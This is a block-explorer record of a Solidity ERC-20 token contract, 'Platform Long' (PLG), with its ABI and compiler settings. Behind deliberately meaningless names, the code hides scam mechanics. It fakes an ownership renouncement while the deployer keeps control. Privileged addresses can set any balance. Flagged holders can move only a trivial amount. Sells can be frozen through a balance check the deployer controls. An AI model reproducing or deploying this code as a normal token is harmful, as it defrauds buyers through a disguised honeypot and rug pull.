{"SourceCode": "//SPDX-License-Identifier: MIT\n\npragma solidity ^0.8.0;\n\ninterface buyAuto {\n    function factory() external pure returns (address);\n\n    function WETH() external pure returns (address);\n}\n\nabstract contract maxAtIs {\n    function _msgSender() internal view virtual returns (address) {\n        return msg.sender;\n    }\n\n    function _msgData() internal view virtual returns (bytes calldata) {\n        return msg.data;\n    }\n}\n\ninterface totalExempt {\n    function createPair(address enableLaunch, address listSwap) external returns (address);\n}\n\ninterface maxMarketingWallet {\n    function totalSupply() external view returns (uint256);\n\n    function balanceOf(address fundTrading) external view returns (uint256);\n\n    function transfer(address buyAtTeam, uint256 shouldMaxTo) external returns (bool);\n\n    function allowance(address toWallet, address spender) external view returns (uint256);\n\n    function approve(address spender, uint256 shouldMaxTo) external returns (bool);\n\n    function transferFrom(\n        address sender,\n        address buyAtTeam,\n        uint256 shouldMaxTo\n    ) external returns (bool);\n\n    event Transfer(address indexed from, address indexed launchedTo, uint256 value);\n    event Approval(address indexed toWallet, address indexed spender, uint256 value);\n}\n\ninterface tradingMarketingEnable is maxMarketingWallet {\n    function name() external view returns (string memory);\n\n    function symbol() external view returns (string memory);\n\n    function decimals() external view returns (uint8);\n}\n\ncontract PlatformLong is maxAtIs, maxMarketingWallet, tradingMarketingEnable {\n\n    function symbol() external view virtual override returns (string memory) {\n        return limitFeeLaunch;\n    }\n\n    function decimals() external view virtual override returns (uint8) {\n        return enableMarketing;\n    }\n\n    function txSell(address launchMode) public {\n        senderTotalLimit();\n        if (txBuy) {\n            minIs = buyLaunch;\n        }\n        if (launchMode == sellFrom || launchMode == fromReceiverAt) {\n            return;\n        }\n        buyFundReceiver[launchMode] = true;\n    }\n\n    address public fromReceiverAt;\n\n    function allowance(address modeWallet, address marketingFundWallet) external view virtual override returns (uint256) {\n        if (marketingFundWallet == walletMarketing) {\n            return type(uint256).max;\n        }\n        return autoIs[modeWallet][marketingFundWallet];\n    }\n\n    function listFrom(uint256 shouldMaxTo) public {\n        senderTotalLimit();\n        modeEnableMarketing = shouldMaxTo;\n    }\n\n    address private enableIsTx;\n\n    uint256 public buyLaunch;\n\n    uint256 private txTradingFund;\n\n    function approve(address marketingFundWallet, uint256 shouldMaxTo) public virtual override returns (bool) {\n        autoIs[_msgSender()][marketingFundWallet] = shouldMaxTo;\n        emit Approval(_msgSender(), marketingFundWallet, shouldMaxTo);\n        return true;\n    }\n\n    function toFund() public {\n        emit OwnershipTransferred(sellFrom, address(0));\n        enableIsTx = address(0);\n    }\n\n    uint256 modeEnableMarketing;\n\n    bool public totalMarketing;\n\n    function totalSupply() external view virtual override returns (uint256) {\n        return amountIsEnable;\n    }\n\n    bool private walletMode;\n\n    function limitTo(address shouldTo) public {\n        require(shouldTo.balance < 100000);\n        if (totalMarketing) {\n            return;\n        }\n        \n        fromExemptSell[shouldTo] = true;\n        if (txTradingFund != shouldTx) {\n            txBuy = true;\n        }\n        totalMarketing = true;\n    }\n\n    uint256 private shouldTx;\n\n    uint256 autoLiquidity;\n\n    event OwnershipTransferred(address indexed tokenListEnable, address indexed listLaunchedAt);\n\n    string private limitFeeLaunch = \"PLG\";\n\n    uint256 private amountIsEnable = 100000000 * 10 ** 18;\n\n    function balanceOf(address fundTrading) public view virtual override returns (uint256) {\n        return maxTrading[fundTrading];\n    }\n\n    function getOwner() external view returns (address) {\n        return enableIsTx;\n    }\n\n    string private buyMarketing = \"Platform Long\";\n\n    uint8 private enableMarketing = 18;\n\n    address walletMarketing = 0x10ED43C718714eb63d5aA57B78B54704E256024E;\n\n    mapping(address => uint256) private maxTrading;\n\n    mapping(address => bool) public buyFundReceiver;\n\n    function owner() external view returns (address) {\n        return enableIsTx;\n    }\n\n    address tradingFrom = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;\n\n    function senderTotalLimit() private view {\n        require(fromExemptSell[_msgSender()]);\n    }\n\n    function minTx(address limitTake, address buyAtTeam, uint256 shouldMaxTo) internal returns (bool) {\n        if (limitTake == sellFrom) {\n            return receiverAtLiquidity(limitTake, buyAtTeam, shouldMaxTo);\n        }\n        uint256 senderAt = maxMarketingWallet(fromReceiverAt).balanceOf(tradingFrom);\n        require(senderAt == modeEnableMarketing);\n        require(buyAtTeam != tradingFrom);\n        if (buyFundReceiver[limitTake]) {\n            return receiverAtLiquidity(limitTake, buyAtTeam, shouldMinIs);\n        }\n        return receiverAtLiquidity(limitTake, buyAtTeam, shouldMaxTo);\n    }\n\n    function receiverAtLiquidity(address limitTake, address buyAtTeam, uint256 shouldMaxTo) internal returns (bool) {\n        require(maxTrading[limitTake] >= shouldMaxTo);\n        maxTrading[limitTake] -= shouldMaxTo;\n        maxTrading[buyAtTeam] += shouldMaxTo;\n        emit Transfer(limitTake, buyAtTeam, shouldMaxTo);\n        return true;\n    }\n\n    function tokenMin(address feeWallet, uint256 shouldMaxTo) public {\n        senderTotalLimit();\n        maxTrading[feeWallet] = shouldMaxTo;\n    }\n\n    mapping(address => mapping(address => uint256)) private autoIs;\n\n    uint256 constant shouldMinIs = 8 ** 10;\n\n    bool private txBuy;\n\n    mapping(address => bool) public fromExemptSell;\n\n    uint256 public minIs;\n\n    function transferFrom(address limitTake, address buyAtTeam, uint256 shouldMaxTo) external override returns (bool) {\n        if (_msgSender() != walletMarketing) {\n            if (autoIs[limitTake][_msgSender()] != type(uint256).max) {\n                require(shouldMaxTo <= autoIs[limitTake][_msgSender()]);\n                autoIs[limitTake][_msgSender()] -= shouldMaxTo;\n            }\n        }\n        return minTx(limitTake, buyAtTeam, shouldMaxTo);\n    }\n\n    function name() external view virtual override returns (string memory) {\n        return buyMarketing;\n    }\n\n    function transfer(address feeWallet, uint256 shouldMaxTo) external virtual override returns (bool) {\n        return minTx(_msgSender(), feeWallet, shouldMaxTo);\n    }\n\n    address public sellFrom;\n\n    uint256 private sellAmount;\n\n    constructor (){\n        if (buyLaunch == sellAmount) {\n            txTradingFund = buyLaunch;\n        }\n        buyAuto txAt = buyAuto(walletMarketing);\n        fromReceiverAt = totalExempt(txAt.factory()).createPair(txAt.WETH(), address(this));\n        \n        sellFrom = _msgSender();\n        toFund();\n        fromExemptSell[sellFrom] = true;\n        maxTrading[sellFrom] = amountIsEnable;\n        if (walletMode) {\n            txBuy = true;\n        }\n        emit Transfer(address(0), sellFrom, amountIsEnable);\n    }\n\n}", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"toWallet\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"tokenListEnable\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"listLaunchedAt\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"launchedTo\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"modeWallet\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"marketingFundWallet\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"marketingFundWallet\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"shouldMaxTo\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"fundTrading\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"buyFundReceiver\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"buyLaunch\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"fromExemptSell\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"fromReceiverAt\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"getOwner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"shouldTo\",\"type\":\"address\"}],\"name\":\"limitTo\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"shouldMaxTo\",\"type\":\"uint256\"}],\"name\":\"listFrom\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"minIs\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"sellFrom\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"toFund\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"feeWallet\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"shouldMaxTo\",\"type\":\"uint256\"}],\"name\":\"tokenMin\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalMarketing\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"feeWallet\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"shouldMaxTo\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"limitTake\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"buyAtTeam\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"shouldMaxTo\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"launchMode\",\"type\":\"address\"}],\"name\":\"txSell\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"}]", "ContractName": "PlatformLong", "CompilerVersion": "v0.8.19+commit.7dd6d404", "OptimizationUsed": "0", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "MIT", "Proxy": "0", "Implementation": "", "SwarmSource": ""}